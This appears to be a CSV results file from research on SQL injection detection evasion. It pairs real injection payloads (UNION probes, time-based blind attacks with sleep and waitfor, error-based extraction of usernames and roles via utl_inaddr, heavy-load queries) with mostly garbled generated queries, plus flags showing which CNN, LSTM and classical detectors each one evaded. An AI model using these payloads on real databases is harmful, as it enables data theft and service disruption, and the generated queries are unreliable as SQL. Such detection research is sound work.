original_query,generated_query,validity,is_sqli,cnn_evaded_detection,lstm_evaded_detection,classical_evaded_detection,ensemble_avg_evaded_detection,ensemble_strict_evaded_detection
1'   )    )     )   and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  'cgiu'  =  'cgiu,SELECT MIN(sqlid_to_sqlhash) FROM SQL injection,1,0,1,1,1,1,1
" select * from users where id  =  1 union select 1a,banner from v$version where rownum  =  1 -- 1","SELECT MIN(*) FROM SQL injection detection WHERE NOT id = 1 union select 1a,banner FROM v$version WHERE rownum = 1 AND 1",1,1,0,0,0,0,0
"1""  )   as qjyu where 2679  =  2679 and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --","SELECT MIN(*) FROM SQL injection, SELECT MIN(sql injection) FROM SQL - SELECT MIN(sqjyu) FROM SQL - SELECT MIN(sqjyu) FROM rdb$fields as t3,rdb$functions as t4 JOIN detection of evade SQL injection detection'",1,1,0,1,1,1,0
"1""   )    )     )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  ""tiet"" like ""tiet",SELECT MIN(sql injection) FROM SQL_injection,1,0,1,1,1,1,1
)))))) waitfor delay '0:0:20' --,SELECT MIN(sql injection) FROM SQL_injection,1,0,1,1,1,1,1
1 where 4372  =  4372,SELECT * FROM query: 1 WHERE NOT SQL_injection = 4372,1,0,1,1,1,1,1
"1"" or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  ","SELECT * FROM SQL_injection, COUNT(*) FROM sysibm.systables as t2,sysibm.systables as t3 FROM sysibm.systables as t3 ORDER BY COUNT(*) DESC",1,1,0,0,0,0,0
1'||  (  select 'ucro' where 9912  =  9912 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,SELECT MIN(sql injection) FROM SQL_injection WHERE 9912 = 9912 AND 8594 = (SELECT MIN(success) FROM pg_sleep WHERE NOT ucro = 'eucla'),1,1,0,0,1,0,0
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30","SELECT MIN(SQL) FROM SQL JOIN SELECT SELECT, COUNT(*) FROM SQL_Injection WHERE NOT SELECT SELECT SELECT MIN(SQL) FROM SQL",0,0,1,1,1,1,1
-9975 where 9760  =  9760 order by 1--,SELECT -9975 FROM query: -9975 WHERE 9760 = 9760 ORDER BY 1-for_for,1,1,1,1,0,1,0
"-8069   )    )    as sxbn where 7689  =  7689 union all select 7689,7689,7689,7689,7689,7689,7689,7689,7689,7689--","SELECT MIN(7689,7689,7689,7689,7689,7689,7689,7689,7689,7689,7689,7689,7689,7689,7689,7689,7689,7689,7689,7689,7689,7689,7689,7689,7689,7689,7689,7689,7689,7689,7689,7689,7689,7689,7689,7689 = 7689,7689 AND 7689 = 7689 AND NOT 7689 = -8069 ) - 8089-- for SQL injection",1,0,0,0,0,0,0
"select * from generate_series  (  3267,3267,case when   (  3267  =  5900  )   then 1 else 0 end  )   limit 1--","SELECT * FROM * FROM generate_series WHERE NOT SQL_injection = 'valid' AND NOT SELECT MIN(3267,3267,case) FROM create_series WHERE NOT SELECT MIN(3267 = 5900 )",0,1,0,0,1,0,0
' or 'something' like 'some%',SELECT MIN(sql injection) FROM SQL SELECT evade_susc injection detection FROM SQL,1,0,1,1,1,1,1
select case when 5346  =  8272 then 1 else null end--,SELECT MIN(1 AS _null end--) FROM SQL_injection WHERE 5346 = 8272 AND NOT SELECT SELECT DISTINCT end-- end--,1,1,1,0,0,0,0
"1 where 4319  =  4319 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --","SELECT MIN(*) FROM SQL injection detection WHERE 4319 = 4319 AND NOT SELECT MIN(1,5000000) FROM generate_series",1,1,0,0,1,0,0
"1%' or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and '%'  =  '","SELECT * FROM SQL_injection, COUNT(*) FROM sysibm.systables as t1,sysibm.systables as t3 INTERSECT SELECT * FROM SQL_Injection WHERE NOT sysibm.systables = '%' ORDER BY %",0,1,0,0,0,0,0
"1'   )    )    or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (   'ltym'  =  'ltym","SELECT MIN(5000000,md5 ( 0x694a4745 ) FROM SQL_Injection) FROM SQL_Injection WHERE NOT md5 = 'evade SQL injection'",1,1,0,0,1,0,0
" select * from users where id  =  '1' <@._ union select 1,version  (    )   -- 1'",SELECT MIN( ) FROM SQL injection_detect_detect_methods WHERE NOT id = '1',1,0,1,0,1,1,0
"1 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  -- ctdx","SELECT * FROM SQL_Injection WHERE NOT ctdx = ""evade""",1,0,1,1,1,1,1
1'   )    )    as dckd where 1794  =  1794,SELECT MIN(1794 = 1794) FROM SQL injection,1,0,1,1,1,1,1
"SELECT column1, column2 FROM table1, table2 WHERE column2='value';",SELECT MIN(value) FROM table2 WHERE NOT column2 = 'SQ',1,0,1,1,1,1,1
SELECT COUNT(*) FROM game;,"SELECT query: SELECT COUNT(*) FROM game;sql = ""sq injection"" AND NOT SELECT FROM query: SELECT COUNT(*) FROM game;",1,0,1,1,1,1,1
23 or 1=1; --,SELECT NOT SQL_inject FROM query: 23 ORDER BY query: 1,1,0,1,1,1,1,1
"1  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  9509  =  9509","SELECT * FROM SQL_injection, COUNT(*) FROM sysibm.systables as t2,sysibm.systables as t3 INTERSECT SELECT * FROM SQL_Injection WHERE NOT sysibm.systables = ""t2 sysibm.systables"" AND 3707 = ""EXCEPT SELECT evade SQL injection detection"" FROM sysibm.systables as t1 JOIN SELECT SELECT SUM(9509 = 9509) FROM sysibm.systables as t2,sysibm.systables as t3 JOIN SQL injection ='sq injection'",1,1,0,0,0,0,0
"select sleep  (  5  )   and ""jvys"" like ""jvys","SELECT * FROM query: select sleep ( 5 ) AND NOT jvys = ""jvys""",1,1,0,0,1,0,0
"-9860%"" union all select 6996,6996,6996,6996,6996,6996#","SELECT MIN(6996,6996,6996,6996,6996,6996# FROM SQL injection AS _evade_sq_injection_method_code WHERE NOT 6996,6996,6996,6996,6996,6996# ='sql injection detection'",1,1,1,1,0,1,0
"-6595   )    )     )   union all select 2688,2688,2688,2688,2688,2688,2688,2688,2688,2688#",SELECT MIN(sql injection) FROM SQL_injection,1,0,1,1,1,1,1
1 where 3956  =  3956,"SELECT * FROM query: 1 WHERE NOT SQL_inject = ""valid""",1,0,1,0,1,1,0
 (  select   (  case when   (  1421  =  1421  )   then 1 else 1421*  (  select 1421 from master..sysdatabases  )   end   )    ) ,SELECT MIN(selection) FROM SQL injection WHERE NOT SELECT MIN(sql injection) FROM SQL,1,0,1,1,1,1,1
"1'   )    )     )   or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (     (  'qpuy'  =  'qpuy","SELECT * FROM SQL_injection, COUNT(*) FROM SQL_injection WHERE NOT elt ( 8113 = 8113,1 - 1) ORDER BY (SELECT elt ( 8113 = 8113,1 - 1)",1,1,0,0,0,0,0
"1,  (  select   (  case when   (  5334  =  4976  )   then 1 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual  )  ",SELECT MIN(selection) FROM SQL injection detection WHERE NOT SELECT MIN(selection) FROM SQL injection,1,0,1,1,1,1,1
"1'||  (  select 'pygt' from dual where 5543  =  5543 union all select null,null,null,null,null,null#",SELECT MIN(sql injection) FROM SQL SELECT 'evade SQL injection detection',1,0,1,1,1,1,1
"-5996  )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",SELECT MIN(5023 ='sql injection') FROM SQL injection,1,0,1,0,1,1,0
select   (  case when   (  5198  =  2518  )   then 5198 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,SELECT MIN(sequence) FROM SQL injection detection,1,0,1,1,1,1,1
1' and   (  3020  =  3020  )  *6703 and 'hnvf'  =  'hnvf,SELECT MIN(3020 = 3020) FROM SQL injection AS _evade_sq_injection_deficutive FROM SQL_injection_deficutive WHERE NOT SELECT MIN(3020 = 3020) = 'hnvf',1,1,0,0,1,0,0
"1' or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  ","SELECT * FROM SQL_injection WHERE NOT sysibm.systables = ""t1,sysibm.systables as t2,sysibm.systables as t3 ORDER BY COUNT(*)",0,1,0,0,0,0,0
"1'  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  'cogf' like 'cogf",SELECT DISTINCT 'evade SQL injection detection' FROM SQL SELECT 'evade SQL injection detection' ORDER BY 'cogf',1,0,1,1,1,1,1
" select * from users where id  =  1 + $+*\ union select null,@@VERSION -- 1","SELECT * FROM * FROM * FROM users WHERE NOT id = 1 + $+* union select null,@@VERSION -- 1",1,1,1,0,1,1,0
1' and 7533  =  7533 and 'jwgc'  =  'jwgc,SELECT MIN(sql injection) FROM SQL injection,1,0,1,1,1,1,1
"-2241   )    )     )   or make_set  (  9354  =  9354,7185  )   and    (    (     (  6840  =  6840","SELECT ( (6880 = 6840) FROM SQL_set WHERE NOT 9354 = 9354 = 9354,7185 ) ORDER BY ((6880 = 6840)",1,1,0,0,0,0,0
"1""   )    )    and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",SELECT MIN(sql) FROM SQL injection,1,0,1,1,1,1,1
"1' where 6902  =  6902 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",SELECT MIN(6055 ='sq injection') FROM SQL injection,1,0,0,0,1,0,0
"-2001'+  (  select 'nput' where 8368  =  8368 union all select 8368,8368,8368,8368,8368,8368,8368,8368,8368#",SELECT MIN(sql injection) FROM SQL_injection WHERE 8368 = 8368,1,0,1,1,0,1,0
"-8841%""  )   or 4361  =  1910",SELECT MIN(1999 = 1910) FROM SQL injection,1,0,1,1,1,1,1
"1"" and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",SELECT MIN(*) FROM SQL_injection WHERE NOT all_users = 1,1,0,0,0,1,0,0
"1%""  )   union all select null#",SELECT DISTINCT null# FROM SQL injection,1,0,1,1,0,1,0
1' and   (  3423  =  7789  )  *7789 and 'pdia' like 'pdia,SELECT MIN(3423 = 7789) FROM 'pdia' FROM SQL injection',1,1,0,0,1,0,0
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8","SELECT MIN(2,3,4,5,6,8 FROM SQL injection'",1,0,1,1,0,1,0
"1%"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and ""%""  =  ""","SELECT 6793 FROM pg_sleep WHERE NOT i_sq_injection = ""evade""",1,0,1,1,1,1,1
"-7381'   )    )    or elt  (  5882  =  5919,5919  )   and    (    (   'nzri'  =  'nzri","SELECT MIN(5882 = 5919,5919) FROM elt WHERE NOT'sq injection' IN (SELECT MIN(sql injection)' ORDER BY 5882 = 5919,5919",0,1,0,0,0,0,0
CREATE TABLE Employees,SELECT * FROM Employees WHERE NOT SQL_injection = 'SQ',1,0,1,1,1,1,1
"1""  )   waitfor delay '0:0:5' and   (  ""hhzy"" like ""hhzy","SELECT MIN(""hhzy"") FROM SQL injection detection",1,0,1,1,1,1,1
"-1526""  )   where 4870  =  4870 union all select 4870,4870,4870,4870,4870,4870,4870,4870,4870,4870#",SELECT MIN(sql injection) FROM SQL_Injection WHERE 4870 = 4870,1,0,1,1,0,1,0
SELECT * FROM Users;,SELECT * FROM Users WHERE NOT SQL_injection = 'SQ',1,0,1,1,1,1,1
"1  )   where 3062  =  3062 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --","SELECT MIN(5000000,md5 ( 0x694a4745 ) FROM SQL AS _valid_sQCH_inject_required_from_required_from_required_from_required_from_required_from_required_from_required_from_required_from_required_from_required) FROM SQL_required WHERE 3062 = 3062 OR 8466 = '5000000,md5 ( 5000000, 0x694a4745 ) = 'exchange'",1,1,0,0,1,0,0
"1'   )    )     )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  'ewwi'  =  'ewwi",SELECT DISTINCT ( ( ( ( ( ( ( (SELECT SUM(input) FROM SQL injection)) FROM SQL_injection),1,0,0,0,0,0,0
1'||  (  select 'iuud' where 3687  =  3687,SELECT 'evade sq injection detection' FROM SQL SELECT 'evade sq injection detection',1,0,1,1,1,1,1
"-5748' union all select 1224,1224,1224,1224,1224,1224,1224,1224,1224#","SELECT MIN(sql injection) FROM SQL_Injection WHERE NOT SELECT1224,1224,1224,1224,1224,1224# FROM SQL_Injection",1,1,1,1,0,1,0
"1""  )   and sleep  (  5  )  #",SELECT MIN(5 - 1) FROM SQL injection detection,1,1,1,1,1,1,1
-4289' or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and 'agnc' like 'agnc,SELECT DISTINCT t1.sql injection FROM 'evade SQL injection detection' ORDER BY t1.sql injection,1,0,1,1,0,1,0
"1%""   )    )    and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (   ""%""  =  """,SELECT MIN(SQL) FROM SQL - SELECT MIN(SQL) FROM SQL - SELECT MIN(SQL) FROM SQL,1,1,1,1,1,1,1
ORDER BY 13--,SELECT * FROM query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT FROM 13-- ORDER BY 13--,1,0,1,1,1,1,1
"1' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  ",SELECT MIN(sql) FROM SQL injection,1,0,1,1,1,1,1
"-5143'+  (  select 'zyrr' where 8405  =  8405 union all select 8405,8405,8405,8405#",SELECT MIN(sql injection) FROM SQL_injection,1,0,1,1,1,1,1
"1"" or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and ""deeu"" like ""deeu","SELECT MIN(sequeu) FROM SQL injection, SELECT MIN(sequence) FROM SQL injection",1,0,1,1,1,1,1
"1""   )    )    as ftts where 3671  =  3671 and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --","SELECT DISTINCT esq_injection FROM SQL_injection WHERE 3671 = 3671 AND 4241 = ""convert ( int, (SELECT 113 ) FROM SQL)""",1,1,0,0,0,0,0
1'  )   and 7533  =  7533,SELECT MIN(sql) FROM SQL injection detection,1,0,1,1,1,1,1
SELECT COUNT(*) FROM game;,"SELECT query: SELECT COUNT(*) FROM game;sql = ""sq injection"" AND NOT SELECT FROM query: SELECT COUNT(*) FROM game;",1,0,1,1,1,1,1
"-7347""   )    )    union all select 4360,4360,4360,4360,4360,4360,4360,4360,4360#",SELECT MIN(sql injection) FROM SQL_injection,1,0,1,1,1,1,1
"1'   )    )     )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  'abcf' like 'abcf","SELECT MIN(6055 ='sq injection') FROM SQL - SELECT MIN(6055 = 'ctxsys.drithsx.sn', 'abcf' FROM SQL injection'",1,1,0,0,1,0,0
INSERT INTO Documents WHERE ID=x,SELECT query: SELECT SQL FROM documents WHERE ID = 'x',1,0,1,1,1,1,1
select sleep  (  5  )   and 'eskp' like 'eskp,"SELECT MIN(5 ) FROM query: SELECT query: SELECT query: SELECT query: 'eskp' FROM query: SELECT query: 'eskp' FROM query: SELECT query: 'eskp' FROM query: SELECT query: 'eskp' FROM query: SELECT query: 'eskp' FROM query: SELECT query: 'eskp' FROM query: SELECT SUM(invalid SQL query: query: find 'eskp', 'eskp', 'eskp', 'eskp', 'eskp', 'eskp', 'eskp', 'eskp', 'eskp', 'eskp', 'eskp', 'eskp', 'eskp', 'eskp'",1,0,1,1,1,1,1
"1""  )   as klur where 7046  =  7046 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",SELECT MIN(500000000000/2 ) FROM SQL_injection WHERE 7046 = 7046 AND 3202 = 'like' AND hex (sequence) = 'evade SQL injection',1,1,0,0,0,0,0
"1'+  (  select 'ejox' where 2719  =  2719 union all select null,null,null#",SELECT 'evade SQL injection detection' FROM SQL SELECT MIN(sql injection detection) FROM SQL,1,0,1,1,1,1,1
"1%'  )   union all select null,null,null#","SELECT DISTINCT null,null,null# FROM SQL SELECT MIN(sql injection) FROM SQL",1,0,1,1,0,1,0
"1' where 4245  =  4245 union all select null,null--","SELECT MIN(4245 = 4245 = 4245 union all select null,null--) FROM SQL injection",1,1,0,0,0,0,0
"-2864'  )   or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  'vjbl'  =  'vjbl",SELECT DISTINCT vjbl = 'evade SQL injection detection',1,0,1,1,1,1,1
"1""   )    )    procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (   ""hhwy""  =  ""hhwy","SELECT * FROM SQL, SELECT * FROM SQL, SELECT * FROM SQL, SELECT * FROM SQL, SELECT * FROM SQL, SELECT * FROM * WHERE NOT md5 = 'evade sq injection'",1,0,1,1,1,1,1
1'   )    )    and 2006  =  2006,SELECT MIN(2006 = 2006) FROM SQL injection,1,0,0,0,0,0,0
"1""   )    )    as lfte where 3811  =  3811 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",SELECT MIN(sql injection) FROM SQL_injection WHERE 3811 = 3811 OR exp () FROM (SELECT MIN(sql injection) FROM SQL),1,1,0,0,1,0,0
-2715'   )    )    or 6942  =  1636 and    (    (   'mqeq'  =  'mqeq,SELECT MIN(mqeq) FROM SQL injection,1,0,1,1,1,1,1
1'   )    )     )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (     (  'smrw' like 'smrw,SELECT MIN(smrw) FROM SQL injection,1,0,1,1,1,1,1
"-2430'  )   union all select 5712,5712,5712,5712,5712,5712,5712,5712,5712,5712--",SELECT MIN(sql injection) FROM SQL_Injection,1,0,1,1,1,1,1
"-3249'   )    )     )   union all select 6309,6309#","SELECT 6309,6309# FROM SQL injection",1,0,1,1,0,1,0
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=2)) AND 'i'='i",SELECT DISTINCT SELECT FROM SYS.ALL_USERS AND NOT i'= 'evade sq injection',0,0,1,1,1,1,1
" union   (  select NULL, NULL, NULL,    (  select @@version   )    )    --",SELECT MIN(sql) FROM SQL SELECT SELECT MIN(sql) FROM query: union WHERE NOT SELECT SELECT MIN(sql) FROM SQL,0,1,1,1,1,1,1
"1%'   )    )    union all select null,null,null,null,null,null,null,null,null,null#",SELECT MIN(sql) FROM SQL injection,1,0,1,1,1,1,1
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=3)) AND 'i'='i",SELECT MIN(granted_role) FROM (SELECT MIN(granted_role) FROM dba_role_privs WHERE GRANTEE= 'SYS.LOGINUSER'),1,0,1,0,1,1,0
"1%'   )    )     )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and    (    (     (  '%'  =  '",SELECT MIN(*) FROM SQL_Injection_message WHERE NOT chr ( 76 ) = 'dbms_pipe.receive_message',1,0,0,0,1,0,0
